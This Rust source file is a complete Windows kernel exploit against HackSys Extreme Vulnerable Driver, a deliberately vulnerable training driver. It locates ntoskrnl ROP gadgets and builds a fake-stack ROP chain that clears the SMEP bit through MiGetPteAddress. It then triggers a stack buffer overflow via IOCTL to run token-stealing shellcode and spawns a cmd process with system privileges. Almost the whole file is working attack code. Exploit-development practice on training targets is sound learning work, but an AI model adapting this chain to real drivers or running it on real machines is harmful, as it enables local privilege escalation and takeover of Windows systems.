use core::ffi::c_void;
use std::iter;

use win_kexp::{
    concat_rop_chain_to_buffer, create_rop_chain,
    rop::{find_gadget_offset, get_executable_sections},
    shellcode::token_stealing_shellcode_smep_no_kvashadow_pte,
    util::bytes_to_hex_string,
    win32k::{
        allocate_memory, allocate_shellcode, close_handle, create_cmd_process, get_device_handle,
        get_ntoskrnl_base_address, io_device_control, load_library_no_resolve, lock_memory,
        FILE_ANY_ACCESS, FILE_DEVICE_UNKNOWN, MEM_COMMIT, MEM_RESERVE, METHOD_NEITHER,
        PAGE_EXECUTE_READWRITE,
    },
    CTL_CODE, IOCTL,
};

const HEVD_IOCTL_BUFFER_OVERFLOW_STACK: u32 = IOCTL!(0x800);

fn find_gadget_offset_with_annotation(
    sections: &Vec<(u64, Vec<u8>)>,
    gadget: &[u8],
    kernel_base: u64,
    annotation: &str,
) -> u64 {
    let offset =
        find_gadget_offset(sections, gadget, kernel_base).expect("[-] Failed to find gadget");
    println!("[+] Found gadget {annotation} at 0x{offset:x}");
    offset
}

fn build_smep_disable_rop_chain(
    krnl_name: &str,
    kernel_base: u64,
    base_offset: usize,
    shellcode_address: u64,
    fake_stack: *mut c_void,
) -> Vec<u8> {
    let mi_get_pte_address = kernel_base + 0x288b28u64;
    println!("[+] MiGetPteAddress address: 0x{mi_get_pte_address:x}");

    let ntoskrnl_handle = load_library_no_resolve(krnl_name).expect("[-] Failed to load ntoskrnl");
    let sections =
        get_executable_sections(ntoskrnl_handle).expect("[-] Failed to get executable sections");

    let pop_rcx_ret_address =
        find_gadget_offset_with_annotation(&sections, &[0x59, 0xC3], kernel_base, "pop rcx ; ret");

    let pop_r15_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x41, 0x5F, 0xC3],
        kernel_base,
        "pop r15 ; ret",
    );

    let pop_rax_ret_address =
        find_gadget_offset_with_annotation(&sections, &[0x58, 0xC3], kernel_base, "pop rax ; ret");

    let push_rax_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x36, 0x50, 0xC3],
        kernel_base,
        "push rax ; ret",
    );

    let mov_r8_rax_mov_rax_r8_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x4C, 0x8B, 0xC0, 0x49, 0x8B, 0xC0, 0xC3],
        kernel_base,
        "mov r8, rax ; mov rax, r8 ; ret",
    );

    let mov_rcx_r8_mov_rax_rcx_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x49, 0x8B, 0xC8, 0x48, 0x8B, 0xC1, 0xC3],
        kernel_base,
        "mov rcx, r8 ; mov rax, rcx ; ret",
    );

    let xor_deref_rcx_rax_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x48, 0x31, 0x01, 0xC3],
        kernel_base,
        "xor deref rcx, rax ; ret",
    );

    let mov_deref_r8_rcx_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x49, 0x89, 0x08, 0xC3],
        kernel_base,
        "mov deref r8, rcx ; ret",
    );

    let pop_r8_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x41, 0x58, 0xC3],
        kernel_base,
        "pop r8 ; ret",
    );

    let pop_rsp_ret_address =
        find_gadget_offset_with_annotation(&sections, &[0x5C, 0xC3], kernel_base, "pop rsp ; ret");

    let mov_esp_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0xBC, 0x1B, 0x8F, 0x41, 0x23, 0xC3],
        kernel_base,
        "mov esp, 0xC48348FF ; ret",
    );

    let add_rsp_28_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x48, 0x83, 0xC4, 0x28, 0xC3],
        kernel_base,
        "add rsp, 0x28 ; ret",
    );

    let pop_r9_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x41, 0x59, 0xC3],
        kernel_base,
        "pop r9 ; ret",
    );

    let add_rcx_r9_cmp_r8_rcx_setae_al_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x49, 0x03, 0xC9, 0x4C, 0x3B, 0xC1, 0x0F, 0x93, 0xC0, 0xC3],
        kernel_base,
        "add rcx, r9 ; cmp r8, rcx ; setae al ; ret",
    );

    let mov_rcx_qword_rcx_ret_address = find_gadget_offset_with_annotation(
        &sections,
        &[0x48, 0x8B, 0x09, 0x48, 0x3B, 0xCA, 0x0F, 0x94, 0xC0, 0xC3],
        kernel_base,
        "mov rcx, qword [rcx] ; cmp rcx, rdx ; sete al ; ret",
    );

    let fake_stack_address = fake_stack.wrapping_add(0x18f1b) as u64;
    let fake_stack_slice =
        unsafe { std::slice::from_raw_parts_mut(fake_stack_address as *mut u8, 0x1400) };

    macro_rules! create_rsp_restore_chain {
        ($stack_offset:expr, $reg_offset:expr) => {
            create_rop_chain!(
                0,
                pop_r8_ret_address,
                fake_stack_address + $stack_offset * 8,
                pop_r9_ret_address,
                $reg_offset,
                add_rcx_r9_cmp_r8_rcx_setae_al_ret_address,
                mov_deref_r8_rcx_ret_address
            )
        };
    }

    macro_rules! create_r15_restore_chain {
        ($stack_offset:expr, $reg_offset:expr) => {
            create_rop_chain!(
                0,
                pop_r8_ret_address,
                fake_stack_address + $stack_offset * 8,
                pop_r9_ret_address,
                $reg_offset,
                add_rcx_r9_cmp_r8_rcx_setae_al_ret_address,
                mov_rcx_qword_rcx_ret_address,
                mov_deref_r8_rcx_ret_address
            )
        };
    }

    macro_rules! create_get_pte_address_chain {
        ($pte_address:expr) => {
            create_rop_chain!(
                0,
                pop_rax_ret_address,
                mi_get_pte_address,
                pop_rcx_ret_address,
                $pte_address,
                push_rax_ret_address,
                mov_r8_rax_mov_rax_r8_ret_address,
                mov_rcx_r8_mov_rax_rcx_ret_address,
                pop_rax_ret_address,
                0x000000000000004u64,
                xor_deref_rcx_rax_ret_address,
            )
        };
    }

    macro_rules! create_prologue_chain {
        ($shellcode_address:expr) => {
            create_rop_chain!(
                0,
                add_rsp_28_ret_address,
                0x4444444444444444u64,
                0x4444444444444444u64,
                0x4444444444444444u64,
                0x4444444444444444u64,
                0x4444444444444444u64,
                $shellcode_address,
                pop_r15_ret_address,
                0x4444444444444444u64,
                pop_rsp_ret_address,
            )
        };
    }

    let restore_rsp_rop_chain = create_rsp_restore_chain!(43, 0x28_u64);
    let restore_r15_rop_chain = create_r15_restore_chain!(41, 0x88_u64);
    let disable_fake_stack_smep_chain = create_get_pte_address_chain!(fake_stack_address);
    let disable_shellcode_smep_chain = create_get_pte_address_chain!(shellcode_address);
    let prologue_chain = create_prologue_chain!(shellcode_address);

    concat_rop_chain_to_buffer!(
        fake_stack_slice,
        restore_rsp_rop_chain,
        restore_r15_rop_chain,
        disable_fake_stack_smep_chain,
        disable_shellcode_smep_chain,
        prologue_chain,
    );

    println!("[+] Main rop chain written to fake stack");

    let main_rop_chain = create_rop_chain!(base_offset, mov_esp_ret_address,);

    main_rop_chain
}

fn exploit_stack_buffer_overflow_token_stealing_smep_no_kvashadow() {
    let device_path = r"\\.\HackSysExtremeVulnerableDriver\0";

    println!("[+] Getting device handle {device_path}...");

    let h_device = get_device_handle(device_path);

    println!("[+] Successfully opened device handle.");

    println!("[+] Getting ntoskrnl base address...");

    let ntoskrnl = get_ntoskrnl_base_address().expect("[-] Failed to get ntoskrnl base address");
    let ntoskrnl_address = ntoskrnl as u64;

    println!("[+] Ntoskrnl base address: 0x{ntoskrnl_address:x}");

    println!("[+] Building payload...");
    let shellcode = token_stealing_shellcode_smep_no_kvashadow_pte();
    let (payload, payload_len) = unsafe { allocate_shellcode(shellcode.as_ptr(), shellcode.len()) };
    unsafe {
        lock_memory(payload, payload_len);
    }

    let payload_address = payload as u64;
    let bytes = bytes_to_hex_string(payload, payload_len);

    println!("\t[*] Payload address: 0x{payload_address:x}");
    println!("\t[*] Payload: 0x{bytes}");

    let ret_overwrite_offset = 0x818;

    let fake_stack = allocate_memory(
        0x23400000_u64,
        0x28000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );
    if fake_stack.is_null() {
        panic!("[-] Failed to allocate fake stack memory");
    }
    unsafe {
        std::ptr::write_bytes(fake_stack, 0x41, 0x28000);
        lock_memory(fake_stack, 0x28000);
    }

    let user_buffer = build_smep_disable_rop_chain(
        "ntoskrnl.exe",
        ntoskrnl_address,
        ret_overwrite_offset,
        payload_address,
        fake_stack,
    );

    println!("[+] Triggering stack buffer overflow...");

    let user_buffer_address = user_buffer.as_ptr() as *mut c_void;
    let user_buffer_address_hex = user_buffer_address as u64;
    println!("\t[*] Address of user buffer: 0x{user_buffer_address_hex:x}");

    io_device_control(
        h_device,
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        user_buffer_address,
        user_buffer.len().try_into().unwrap(),
        std::ptr::null_mut(),
        0,
    );

    close_handle(h_device);

    println!("[+] Successfully closed device handle.");

    let pi = create_cmd_process();

    println!("[+] Process created with ID: {}", pi.dwProcessId);
}

fn main() {
    exploit_stack_buffer_overflow_token_stealing_smep_no_kvashadow();
}
